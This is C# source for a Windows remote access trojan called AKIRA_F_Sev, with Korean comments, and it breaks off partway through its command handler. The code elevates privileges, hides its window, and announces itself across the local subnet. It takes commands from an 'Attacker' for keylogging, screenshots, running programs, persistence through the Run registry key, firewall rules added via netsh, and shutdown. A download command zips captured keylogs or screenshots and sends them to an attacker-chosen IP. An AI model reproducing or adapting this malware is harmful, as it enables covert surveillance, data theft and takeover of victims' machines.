using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;

namespace AKIRA_F_Sev
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        public static extern void keybd_event(uint vk, uint scan, uint flags, uint extraInfo);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        public int T = 0;
        public int T2 = 0;
        private void Form1_Load(object sender, EventArgs e)
        {


            /* 실행 시 관리자 권한 상승을 위한 코드 시작 */
            if (/* Main 아래에 정의된 함수 */IsAdministrator() == false)
            {
                try
                {
                    ProcessStartInfo procInfo = new ProcessStartInfo();
                    procInfo.UseShellExecute = true;
                    procInfo.FileName = Application.ExecutablePath;
                    procInfo.WorkingDirectory = Environment.CurrentDirectory;
                    procInfo.Verb = "runas";
                    Process.Start(procInfo);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message.ToString());
                }

                Application.ExitThread();
                Application.Exit();
                return;
            }
            //Thread cts = new Thread(new ThreadStart(CTS));
            //cts.Start();

            var handle = GetConsoleWindow();
            // Hide
            ShowWindow(handle, SW_HIDE);
            this.Opacity = 0;
            this.ShowInTaskbar = false;

            Start();
        }

        /* 실행 시 관리자 권한 상승을 위한 함수 시작 */
        public static bool IsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();

            if (null != identity)
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }


            return false;
        }
        /* 실행 시 관리자 권한 상승을 위한 함수 끝 */

        public static string CHAT = "OK";
        public static int T2S_S = 0;
        public string chat
        {
            get { return CHAT; }
            set { CHAT = value; }
        }

        public int T2S
        {
            get { return T2S_S; }
            set { T2S_S = value; }
        }

        public void Start()
        {
            Thread t1 = new Thread(new ThreadStart(timer1Start)); //자신의 IP정보를 모든 대역으로 보낸다. //보내는 모든 대역은 가장기본인 192.168.0.xxx 다 상황에따라 바꿔사용한다.
            t1.Start();

            Thread t2 = new Thread(new ThreadStart(timer2Start)); //richbox 갱신
            t2.Start();

            IPEndPoint ipEndPoint1 = new IPEndPoint(IPAddress.Any, 7779);
            IPEndPoint ipEndPoint2 = new IPEndPoint(IPAddress.Any, 7080);
            IPEndPoint ipEndPoint3 = new IPEndPoint(IPAddress.Any, 8087);

            IPEndPoint[] ipEndPoint = new IPEndPoint[3] { ipEndPoint1, ipEndPoint2, ipEndPoint3 };
            //IPEndPoint[] ipEndPoint = new IPEndPoint[1] { ipEndPoint1 };

            ListenPorts listenport = new ListenPorts(ipEndPoint);
            listenport.beginListen();


            richTextBox1.Text += "Begin Listen" + Environment.NewLine;


        }

        void timer1Start()
        {
            System.Timers.Timer timer1 = new System.Timers.Timer();
            timer1.Interval = 1000;
            timer1.Elapsed += new ElapsedEventHandler(timer1_Elapsed);
            timer1.Start();
        }

        void timer1_Elapsed(object sender, ElapsedEventArgs e)
        {
            T++;
            if (T == 600)
            {
                BroadCast();
                T = 0;
            }
        }

        void timer2Start()
        {
            System.Timers.Timer timer2 = new System.Timers.Timer();
            timer2.Interval = 10;
            timer2.Elapsed += new ElapsedEventHandler(timer2_Elapsed);
            timer2.Start();
        }

        void timer2_Elapsed(object sender, ElapsedEventArgs e)
        {
            try
            {
                if (T2S_S == 1)
                {
                    richTextBox1.Text += CHAT.ToString() + Environment.NewLine;
                    T2S_S = 0;
                }
            }
            catch
            {
                MessageBox.Show("에러");
            }
        }

        public static byte[] packetData;

        public void BroadCast()
        {
            string MyIP = "";
            IPHostEntry host = Dns.GetHostByName(Dns.GetHostName());
            MyIP = host.AddressList[0].ToString();

            IPEndPoint[] Pumping = new IPEndPoint[254];

            string[] BRCast_Array = MyIP.Split('.');
            string BRCast = "";

            for (int i = 0; i < 2; i++)
            {
                BRCast += BRCast_Array[i] + ".";
            }
            //BRCast = BRCast.Substring(0, BRCast.LastIndexOf('.')); //마지막 문자열 "." 을 삭제함

            for (int i = 0; i < 254; i++)
            {
                Pumping[i] = new IPEndPoint(IPAddress.Parse(BRCast + (i + 1)), 12345); //보내는 모든 대역은 가장기본인 192.168.0.xxx 다 상황에따라 바꿔사용한다.
            }


            packetData = ASCIIEncoding.ASCII.GetBytes("[" + MyIP.ToString() + "]");

            Socket FastSend = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

            try
            {
                foreach (IPEndPoint ep in Pumping)
                {
                    //Console.WriteLine(ep.ToString());
                    FastSend.SendTo(packetData, ep);

                    richTextBox1.Text += "[" + MyIP + "] 를" + ep.ToString() + "에 전송완료" + Environment.NewLine;
                }
            }
            catch (Exception e)
            {
                richTextBox1.Text += e + Environment.NewLine;
            }
        }

        private void richTextBox1_KeyDown(object sender, KeyEventArgs e)
        {

        }
    }

    class ListenPorts
    {
        private static readonly string FirewallCmd = "netsh firewall add allowedprogram \"{1}\" \"{0}\" ENABLE";
        private static readonly string AdvanceFirewallCmd = "netsh advfirewall firewall add rule name=\"{0}\" dir=in action=allow program=\"{1}\" enable=yes";
        private static readonly int VistaMajorVersion = 6;

        private List<Socket> _Clients;
        private Thread _Thread;

        public IPEndPoint ipep1; //Attacker에게 데이터를 전송할 종단점
        public IPEndPoint ipep2; //FTP서버
        public IPEndPoint ipep3; //Web서버

        string Yip; //Attacker의 FTPServer IP
        public static int T = 0; //에러를 확인하기 위한 인수
        Socket[] socket;
        IPEndPoint[] ipEndPoint;
        public static string FTPFileN;
        public static string FolderSC = "";
        public static string DIRSC = "";
        public static string KLPath = @"C:\factory\key\";
        public static int key = 0;
        public static int key2 = 0;

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        internal ListenPorts(IPEndPoint[] ipEndPoint)
        {
            this.ipEndPoint = ipEndPoint;
            socket = new Socket[ipEndPoint.Length];
        }

        public void beginListen()
        {
            Process[] processList = Process.GetProcessesByName("cmd");

            if (processList.Length > 0)
            {
                processList[0].Kill();
            }

            //for (int i = 0; i < ipEndPoint.Length; i++)
            //{
            socket[0] = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket[0].Bind(ipEndPoint[0]);

            Thread t_handler = new Thread(threadListen);
            t_handler.IsBackground = true;
            t_handler.Start(socket[0]);
            //}
        }

        public void WSV()
        {
            if (!File.Exists(Application.StartupPath + @"\web\main.html"))
            {
                if (!Directory.Exists(Application.StartupPath + @"\web\"))
                {
                    Directory.CreateDirectory(Application.StartupPath + @"\web\");
                }


                string Htemp =
                    "<html>"
                    + Environment.NewLine
                    + "<head>" + Environment.NewLine
                    + "<meta charset = " + '\u0022' + "utf-8" + '\u0022' + ">" + Environment.NewLine
                    + "</head>" + Environment.NewLine
                    + "<body>" + Environment.NewLine
                    + "<img src = " + '\u0022' + "1.png" + '\u0022' + "width = " + '\u0022' + "100%" + '\u0022' + "height = " + '\u0022' + "100%" + '\u0022' + ">" + Environment.NewLine
                    + "</body>" + Environment.NewLine
                    + "</html>";

                File.AppendAllText(Application.StartupPath + @"\web\main.html", Htemp);
            }

            socket[2] = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket[2].Bind(ipEndPoint[2]);
            socket[2].Listen(20);

            Thread t_handler3 = new Thread(WSV_S);
            t_handler3.IsBackground = true;
            t_handler3.Start(socket[2]);
        }

        public void WSV_S(object sender)
        {
            Form1 cts = new Form1();

            while (true)
            {
                Socket m_client = sender as Socket;
                m_client.Listen(20);
                Socket client = m_client.Accept();
                //Socket client = socket[2].Accept();

                try
                {
                    Console.Write("성공");
                    cts.chat = "성공";
                    cts.T2S = 1;
                    String file = Recieve(client);
                    Console.WriteLine("========================================");
                    cts.chat = "========================================";
                    cts.T2S = 1;
                    Console.WriteLine(file.ToString());
                    Console.WriteLine("========================================");
                    cts.chat = "========================================";
                    cts.T2S = 1;
                    FileInfo FI = new FileInfo(file);
                    client.Send(Header(client, FI));
                }
                catch { }
                finally
                {
                    client.Close();
                }
            }
        }

        public String Recieve(Socket client)
        {
            Form1 cts = new Form1();
            
            String data_str = "";
            byte[] data = new byte[4096];
            client.Receive(data);
            Console.WriteLine(Encoding.Default.GetString(data).Trim('\0'));
            String[] buf = Encoding.Default.GetString(data).Split("\r\n".ToCharArray());

            if (buf[0].IndexOf("GET") != -1)
            {
                data_str = buf[0].Replace("GET", "").Replace("HTTP/1.1", "").Trim();
            }

            else
            {
                data_str = buf[0].Replace("POST ", "").Replace("HTTP/1.1", "").Trim();
            }

            if (data_str.Trim() == "/")
            {
                data_str += "main.html";
            }

            int pos = data_str.IndexOf("?");
            if (pos > 0)
            {
                data_str = data_str.Remove(pos);
            }
            Console.WriteLine("========================================");
            cts.chat = "========================================";
            cts.T2S = 1;
            Console.WriteLine(data_str.ToString() + "+datastr");
            cts.chat = data_str.ToString() + "+datastr";
            cts.T2S = 1;
            Console.WriteLine("========================================");
            cts.chat = "========================================";
            cts.T2S = 1;
            return "web" + data_str; //main.html 파일의 폴더경로다
        }

        public byte[] Header(Socket client, FileInfo FI)
        {
            Form1 cts = new Form1();

            Console.WriteLine("========================================");
            cts.chat = "========================================";
            cts.T2S = 1;
            Console.WriteLine(FI.ToString() + "FI");
            cts.chat = FI.ToString() + "FI";
            cts.T2S = 1;
            Console.WriteLine("========================================");
            cts.chat = "========================================";
            cts.T2S = 1;

            byte[] data2 = new byte[FI.Length];
            try
            {
                FileStream FS = new FileStream(FI.FullName, FileMode.Open, FileAccess.Read);

                FS.Read(data2, 0, data2.Length);
                FS.Close();

                String buf = "HTTP/1.0 200 ok\r\n";
                buf += "Data: " + FI.CreationTime.ToString() + "\r\n";
                buf += "server: Myung server\r\n";
                buf += "Content-Length: " + data2.Length.ToString() + "\r\n";
                buf += "content-type:text/html\r\n";
                buf += "\r\n";
                Console.WriteLine("========================================");
                cts.chat = "========================================";
                cts.T2S = 1;
                Console.WriteLine(buf.ToString() + "HEADER");
                cts.chat = buf.ToString() + "HEADER";
                cts.T2S = 1;
                Console.WriteLine("========================================");
                cts.chat = "========================================";
                cts.T2S = 1;
                client.Send(Encoding.Default.GetBytes(buf));
            }
            catch
            {
                String buf = "HTTP/1.0 100 BedRequest ok\r\n";
                buf += "server: Myung server\r\n";
                buf += "content-type:text/html\r\n";
                buf += "\r\n";
                client.Send(Encoding.Default.GetBytes(buf));
                data2 = Encoding.Default.GetBytes("Bed Request");

            }


            return data2;
        }

        public void FTPListen()
        {
            Form1 cts = new Form1();

            socket[1] = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket[1].Bind(ipEndPoint[1]);

            Thread t_handler2 = new Thread(FTPServer);
            t_handler2.IsBackground = true;
            t_handler2.Start(socket[1]);
            Console.WriteLine("FTP서버 열기성공");
            cts.chat = "FTP서버 열기성공";
            cts.T2S = 1;
        }

        public void FTPServer(object sender)
        {
            Form1 cts = new Form1();
            Socket m_client = sender as Socket;
            m_client.Listen(100);
            Socket newSocket = m_client.Accept();
            Console.WriteLine("연결대기 성공");
            cts.chat = "연결대기 성공";
            cts.T2S = 1;

            byte[] buffer = new byte[4];
            newSocket.Receive(buffer);
            int fileLength = BitConverter.ToInt32(buffer, 0);
            buffer = new byte[1024];
            int totalLength = 0;
            Console.WriteLine("성공");
            cts.chat = "성공";
            cts.T2S = 1;
            Console.WriteLine(FTPFileN);
            cts.chat = FTPFileN;
            cts.T2S = 1;

            FileStream fileStr = new FileStream(FTPFileN, FileMode.Create, FileAccess.Write);
            BinaryWriter writer = new BinaryWriter(fileStr);
            Console.WriteLine("마지막단계 성공");
            cts.chat = "마지막단계 성공";
            cts.T2S = 1;
            while (totalLength < fileLength)
            {

                int receiveLength = newSocket.Receive(buffer);
                writer.Write(buffer, 0, receiveLength);
                totalLength += receiveLength;

            }
            Console.WriteLine("전송받음");
            cts.chat = "전송받음";
            cts.T2S = 1;
            writer.Close();
            newSocket.Close();
            m_client.Close();
            try
            {
                File.Move(FTPFileN, "C:\\factory\\" + FTPFileN);
            }
            catch
            {
                if (File.Exists("C:\\factory\\" + FTPFileN))
                {
                    File.Delete(FTPFileN);
                }
            }
            return;
        }

        public static bool AuthorizeProgram(string name, string programFullPath)
        {
            try
            { // OS version check 
                string strFormat = FirewallCmd;
                if (System.Environment.OSVersion.Version.Major >= VistaMajorVersion)
                {
                    strFormat = AdvanceFirewallCmd;
                }
                // Start to register 
                string command = String.Format(strFormat, name, programFullPath);
                System.Console.WriteLine(command);

                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.CreateNoWindow = true;
                startInfo.FileName = "cmd.exe";
                startInfo.UseShellExecute = false;
                startInfo.RedirectStandardInput = true;
                startInfo.RedirectStandardOutput = true;
                startInfo.RedirectStandardError = true;

                Process process = new Process();
                process.EnableRaisingEvents = false;
                process.StartInfo = startInfo;
                process.Start();
                process.StandardInput.Write(command + Environment.NewLine);
                process.StandardInput.Close();

                string result = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit(); process.Close();
            }
            catch
            {
                return false;
            }

            return true;
        }

        void CAP()
        {
            Form1 cts = new Form1();

            test1 ms = new test1();
            ms.a = new List<Int32>();

            int FN = 1;
            int max = 0;
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);

            var gfxScreenShot = Graphics.FromImage(bmpScreenshot);
            gfxScreenShot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);

            if (!Directory.Exists("C:\\work"))
            {
                Directory.CreateDirectory("C:\\work");
                bmpScreenshot.Save("C:\\work\\" + FN + ".png", ImageFormat.Png);
                bmpScreenshot.Dispose();
            }
            else
            {
                try
                {
                    if (File.Exists("C:\\work\\1.png"))
                    {
                        DirectoryInfo dir = new DirectoryInfo("C:\\work");
                        foreach (string name in Directory.GetFiles(Convert.ToString(dir)))
                        {
                            string[] temp = name.Split('\\');
                            Console.WriteLine(temp[2]); // x.png
                            cts.chat = temp[2];
                            cts.T2S = 1;

                            string[] temp2 = temp[2].Split('.');
                            Console.WriteLine(temp2[0]);
                            cts.chat = temp[0];
                            cts.T2S = 1;
                            ms.a.Add(Convert.ToInt32(temp2[0]));

                        }

                        foreach (Int32 b in ms.a)
                        {
                            if (max < b)
                            {
                                max = b;
                            }
                        }
                        Console.WriteLine("최대값 : " + max);
                        cts.chat = "최대값 : " + max;
                        cts.T2S = 1;
                        bmpScreenshot.Save("C:\\work\\" + (max + 1) + ".png", ImageFormat.Png);
                        bmpScreenshot.Dispose();
                    }
                    else
                    {
                        bmpScreenshot.Save("C:\\work\\" + FN + ".png", ImageFormat.Png);
                        bmpScreenshot.Dispose();
                    }
                }
                catch
                {
                    bmpScreenshot.Save("C:\\work\\" + FN + ".png", ImageFormat.Png);
                    bmpScreenshot.Dispose();
                }
            }
        }

        private void threadListen(object sender) //서버 시작부분
        {
            System.Timers.Timer timer2 = new System.Timers.Timer(); //키로그캡쳐
            timer2.Interval = 1000;
            timer2.Elapsed += new ElapsedEventHandler(timer2_Elapsed);

            Form1 cts = new Form1();
            while (true)
            {
                Socket m_client = sender as Socket;
                m_client.Listen(100);
                Socket newSocket = m_client.Accept();

                while (true)
                {
                    try
                    {
                        //문자열 수신부
                        byte[] data = new byte[1024];
                        int bytes = newSocket.Receive(data);
                        string result = Encoding.Unicode.GetString(data, 0, bytes);

                        IPEndPoint remoteIP = newSocket.RemoteEndPoint as IPEndPoint;
                        IPEndPoint localIP = newSocket.LocalEndPoint as IPEndPoint;

                        Console.WriteLine("SERVER ip : " + localIP.ToString() + " REMOTE ip : " + remoteIP.ToString());
                        cts.chat = "SERVER ip : " + localIP.ToString() + " REMOTE ip : " + remoteIP.ToString();
                        cts.T2S = 1;
                        Console.WriteLine("Attacker : " + result);
                        cts.chat = "Attacker : " + result;
                        cts.T2S = 1;

                        string[] temp = result.Split(':');

                        if (temp[0] == "FTP$")
                        {
                            try
                            {
                                if (!Directory.Exists("C:\\factory"))
                                {
                                    Directory.CreateDirectory("C:\\factory");
                                    Console.WriteLine("신규폴더 생성 완료");
                                    cts.chat = "신규폴더 생성 완료";
                                    cts.T2S = 1;
                                }
                                else
                                {
                                    FTPFileN = temp[1];
                                    Console.WriteLine("파일 읽기 성공");
                                    cts.chat = "파일 읽기 성공";
                                    cts.T2S = 1;

                                    cts.chat = temp[1];
                                    cts.T2S = 1;
                                    string msg = "전송중..."; //Received 되는 문자열
                                    byte[] Error = Encoding.Unicode.GetBytes(msg);
                                    newSocket.Send(Error, Error.Length, SocketFlags.None);
                                    Console.WriteLine("Send data : {0}", msg);
                                    Console.WriteLine();
                                    cts.chat = "Send data  : " + msg + Environment.NewLine;
                                    cts.T2S = 1;

                                    FTPListen();
                                }

                            }
                            catch
                            {
                                string msg = "파일이 이미 있거나 잘못 입력되었습니다."; //Received 되는 문자열
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                                cts.chat = "Send data  : " + msg + Environment.NewLine;
                                cts.T2S = 1;
                            }

                        }
                        else if (temp[0] == "MSG$")
                        {
                            MessageBox.Show(temp[1].ToString());
                            Console.WriteLine(temp[1]);
                            cts.chat = temp[1];
                            cts.T2S = 1;
                        }
                        else if (temp[0] == "CAP$")
                        {
                            CAP();

                            string msg = "실행완료 되었습니다!!"; //Received 되는 문자열
                            byte[] Error = Encoding.Unicode.GetBytes(msg);
                            newSocket.Send(Error, Error.Length, SocketFlags.None);
                            Console.WriteLine("Send data : {0}", msg);
                            Console.WriteLine();
                        }
                        else if (temp[0] == "CONNECT$")
                        {
                            string msg = "접속 되었습니다!"; //Received 되는 문자열
                            byte[] Error = Encoding.Unicode.GetBytes(msg);
                            newSocket.Send(Error, Error.Length, SocketFlags.None);
                            Console.WriteLine("Send data : {0}", msg);
                            Console.WriteLine();
                            cts.chat = "Send data  : " + msg + Environment.NewLine;
                            cts.T2S = 1;
                        }
                        else if (temp[0] == "STF$")
                        {
                            string[] Dirtemp = temp[1].Split('*'); //경로의 '*'문자를 ':' 로 변경
                            string DR = ""; //수정된 경로를 저장할 곳이다.

                            for (int i = 0; i < Dirtemp.Length; i++)
                            {
                                DR += Dirtemp[i] + ":";
                            }
                            DR = DR.Substring(0, DR.LastIndexOf(':')); //마지막 문자열 ":" 을 삭제함

                            string prog = Path.Combine(DR);
                            Process.Start(prog);

                            string msg = "실행완료 되었습니다!!"; //Received 되는 문자열
                            byte[] Error = Encoding.Unicode.GetBytes(msg);
                            newSocket.Send(Error, Error.Length, SocketFlags.None);
                            Console.WriteLine("Send data : {0}", msg);
                            Console.WriteLine();
                            cts.chat = "Send data  : " + msg + Environment.NewLine;
                            cts.T2S = 1;
                        }
                        else if (temp[0] == "KLO$")
                        {
                            key2 = 1;

                            timer2.Start();

                            Thread KLO = new Thread(new ThreadStart(KLY)); //키로그
                            KLO.Start();

                            string msg = "키보드 후킹이 시작되었습니다. 로그와사진의 경로는 C:\\factory\\key\\ 안에저장됩니다."; //Received 되는 문자열
                            byte[] Error = Encoding.Unicode.GetBytes(msg);
                            newSocket.Send(Error, Error.Length, SocketFlags.None);
                            Console.WriteLine("Send data : {0}", msg);
                            Console.WriteLine();
                            cts.chat = "Send data  : " + msg + Environment.NewLine;
                            cts.T2S = 1;
                        }
                        else if (temp[0] == "KLN$")
                        {
                            key2 = 0;

                            timer2.Stop();

                            string msg = "키보드 후킹이 중지되었습니다."; //Received 되는 문자열
                            byte[] Error = Encoding.Unicode.GetBytes(msg);
                            newSocket.Send(Error, Error.Length, SocketFlags.None);
                            Console.WriteLine("Send data : {0}", msg);
                            Console.WriteLine();
                            cts.chat = "Send data  : " + msg + Environment.NewLine;
                            cts.T2S = 1;
                        }
                        else if (temp[0] == "WEB$")
                        {
                            Thread WebServer = new Thread(new ThreadStart(WSV));
                            WebServer.Start();

                            //Process.Start(WSV);//ASP.NET서버

                            string msg = "화면이 공유되었습니다. 'http://타겟IP:8087' 에서 확인 가능합니다."; //Received 되는 문자열
                            byte[] Error = Encoding.Unicode.GetBytes(msg);
                            newSocket.Send(Error, Error.Length, SocketFlags.None);
                            Console.WriteLine("Send data : {0}", msg);
                            Console.WriteLine();
                            cts.chat = "Send data  : " + msg + Environment.NewLine;
                            cts.T2S = 1;

                        }

                        else if (temp[0] == "RMT$")
                        {
                            if (File.Exists(@"C:\factory\SMT1.0.exe"))
                            {

                                AuthorizeProgram("SMT1.0.exe", @"C:\factory\SMT1.0.exe");

                                Process.Start(@"C:\factory\SMT1.0.exe");

                                string msg = "화면이 공유되었습니다. 'http://타겟IP:8050' 에서 확인 가능합니다."; //Received 되는 문자열
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                                cts.chat = "Send data  : " + msg + Environment.NewLine;
                                cts.T2S = 1;
                            }
                            else
                            {
                                string msg = "STM 모듈이 없습니다. 업로드 기능을 통해 모듈을 먼저 factory에 올려주세요"; //Received 되는 문자열
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                                cts.chat = "Send data  : " + msg + Environment.NewLine;
                                cts.T2S = 1;
                            }

                        }
                        else if (temp[0] == "RMN$")
                        {
                            Process[] procList = Process.GetProcessesByName("SMT1.0");
                            if (procList.Length > 0)
                            {
                                procList[0].Kill();
                                string msg = "화면공유가 중지되었습니다.";
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                                cts.chat = "Send data  : " + msg + Environment.NewLine;
                                cts.T2S = 1;

                            }
                            else
                            {
                                string msg = "Error : 화면공유중이 아닙니다.";
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                                cts.chat = "Send data  : " + msg + Environment.NewLine;
                                cts.T2S = 1;
                            }
                        }
                        else if (temp[0] == "STH$")
                        {
                            string time = temp[1].ToString();
                            Process.Start("shutdown.exe", "-s -t " + time);
                            newSocket.Close();
                            m_client.Close();
                            return;
                        }
                        else if (temp[0] == "STT$")
                        {
                            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);

                            //레지스트리 등록 할때
                            if (registryKey.GetValue("MyApp") == null)
                            {
                                registryKey.SetValue("MyApp", Application.ExecutablePath.ToString());
                            }

                            string msg = "시작프로그램이 등록되었습니다."; //Received 되는 문자열
                            byte[] Error = Encoding.Unicode.GetBytes(msg);
                            newSocket.Send(Error, Error.Length, SocketFlags.None);
                            Console.WriteLine("Send data : {0}", msg);
                            Console.WriteLine();
                            cts.chat = "Send data  : " + msg + Environment.NewLine;
                            cts.T2S = 1;
                        }
                        else if (temp[0] == "STD$")
                        {
                            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);

                            //레지스트리 삭제 할때
                            if (registryKey.GetValue("MyApp") == null)
                            {
                                registryKey.DeleteValue("MyApp", false);
                            }

                            string msg = "시작프로그램 등록이 해제되었습니다."; //Received 되는 문자열
                            byte[] Error = Encoding.Unicode.GetBytes(msg);
                            newSocket.Send(Error, Error.Length, SocketFlags.None);
                            Console.WriteLine("Send data : {0}", msg);
                            Console.WriteLine();
                            cts.chat = "Send data  : " + msg + Environment.NewLine;
                            cts.T2S = 1;
                        }
                        else if (temp[0] == "WIN$")
                        {
                            try
                            {
                                int y = Convert.ToInt32(temp[1]);

                                for (int x = 0; x < y; x++)
                                {
                                    Process.Start("http://" + temp[2]);
                                }

                                string msg = "성공"; //Received 되는 문자열
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                                cts.chat = "Send data  : " + msg + Environment.NewLine;
                                cts.T2S = 1;
                            }
                            catch
                            {
                                string msg = "성공"; //Received 되는 문자열
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                                cts.chat = "Send data  : " + msg + Environment.NewLine;
                                cts.T2S = 1;

                                Console.WriteLine("인수가 입력되지 않았습니다. 다시입력해 주세요");
                                cts.chat = "인수가 입력되지 않았습니다. 다시입력해 주세요";
                                cts.T2S = 1;
                            }
                        }
                        else if (temp[0] == "KILL$")
                        {
                            string msg = "종료성공"; //Received 되는 문자열
                            byte[] Error = Encoding.Unicode.GetBytes(msg);
                            newSocket.Send(Error, Error.Length, SocketFlags.None);
                            Console.WriteLine("Send data : {0}", msg);
                            Console.WriteLine();
                            cts.chat = "Send data  : " + msg + Environment.NewLine;
                            cts.T2S = 1;

                            Process[] processList = Process.GetProcessesByName("AKIRA_F_Sev.exe");

                            if (processList.Length > 0)
                            {
                                processList[0].Kill();
                            }
                            Environment.Exit(0);
                        }
                        else if (temp[0] == "POK$")
                        {
                            Process[] processList = Process.GetProcessesByName(temp[1].ToString());

                            if (processList.Length > 0)
                            {
                                processList[0].Kill();
                            }

                            string msg = "종료성공"; //Received 되는 문자열
                            byte[] Error = Encoding.Unicode.GetBytes(msg);
                            newSocket.Send(Error, Error.Length, SocketFlags.None);
                            Console.WriteLine("Send data : {0}", msg);
                            Console.WriteLine();
                            cts.chat = "Send data  : " + msg + Environment.NewLine;
                            cts.T2S = 1;
                        }
                        else if (temp[0] == "IEX$")
                        {
                            string msg = "익스플로러 종료성공"; //Received 되는 문자열
                            byte[] Error = Encoding.Unicode.GetBytes(msg);
                            newSocket.Send(Error, Error.Length, SocketFlags.None);
                            Console.WriteLine("Send data : {0}", msg);
                            Console.WriteLine();
                            cts.chat = "Send data  : " + msg + Environment.NewLine;
                            cts.T2S = 1;

                            Process[] processList = Process.GetProcessesByName("iexplorer");

                            if (processList.Length > 0)
                            {
                                processList[0].Kill();
                            }
                        }
                        else if (temp[0] == "POL$")
                        {
                            string Ptemp = "";

                            try
                            {
                                Process[] allProc = Process.GetProcesses();    //시스템의 모든 프로세스 정보 출력
                                int i = 1;
                                Ptemp += "****** 모든 프로세스 정보 ******" + Environment.NewLine;
                                Console.WriteLine("현재 실행중인 모든 프로세스 수 : {0}", allProc.Length);
                                cts.chat = "현재 실행중인 모든 프로세스 수 : " + allProc.Length;
                                cts.T2S = 1;
                                foreach (Process p in allProc)
                                {
                                    Ptemp += i++ + "번째 프로세스 이름 : " + p.ProcessName + Environment.NewLine;
                                }

                                string msg = Ptemp; //Received 되는 문자열
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                                cts.chat = "Send data  : " + msg + Environment.NewLine;
                                cts.T2S = 1;
                            }
                            catch
                            {
                                string msg = "명령이 잘못되었거나 소스코드에 문제가 있습니다."; //Received 되는 문자열
                                byte[] Error = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(Error, Error.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                                cts.chat = "Send data  : " + msg + Environment.NewLine;
                                cts.T2S = 1;
                            }
                        }
                        else if (temp[0] == "DOWN$")
                        {

                            //temp[2] = 다운로드 받을 파일의 경로
                            if (temp[2] == "캡쳐")
                            {
                                try
                                {
                                    string Zip = "C:\\work.zip";
                                    string path = "C:\\work\\";
                                    if (File.Exists(Zip))
                                    {
                                        File.Delete(Zip);
                                    }
                                    else
                                    {
                                        ZipFile.CreateFromDirectory(path, Zip);
                                    }

                                    Yip = temp[1].ToString(); //다운로드 받는 컴퓨터의 IP
                                    ipep1 = new IPEndPoint(IPAddress.Parse(Yip), 7777);

                                    Socket server1 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                                    server1.Connect(ipep1);
                                    Console.WriteLine(Environment.NewLine + "접속완료!!");
                                    cts.chat = Environment.NewLine + "접속완료!!";
                                    cts.T2S = 1;
                                    FileStream fileStr = new FileStream(Zip, FileMode.Open, FileAccess.Read);
                                    int fileLength = (int)fileStr.Length;
                                    byte[] buffer = BitConverter.GetBytes(fileLength);
                                    server1.Send(buffer);
                                    int count = fileLength / 1024 + 1;

                                    BinaryReader reader = new BinaryReader(fileStr);

                                    for (int i = 0; i < count; i++)
                                    {
                                        buffer = reader.ReadBytes(1024);
                                        server1.Send(buffer);
                                    }
                                    reader.Close();
                                    server1.Close();
                                }
                                catch
                                {

                                }
                            }
                            else if (temp[2] == "키로그")
                            {
                                try
                                {
                                    string Zip = "C:\\work.zip";
                                    string path = "C:\\factory\\Key\\";
                                    if (File.Exists(Zip))
                                    {
                                        File.Delete(Zip);
                                    }
                                    else
                                    {
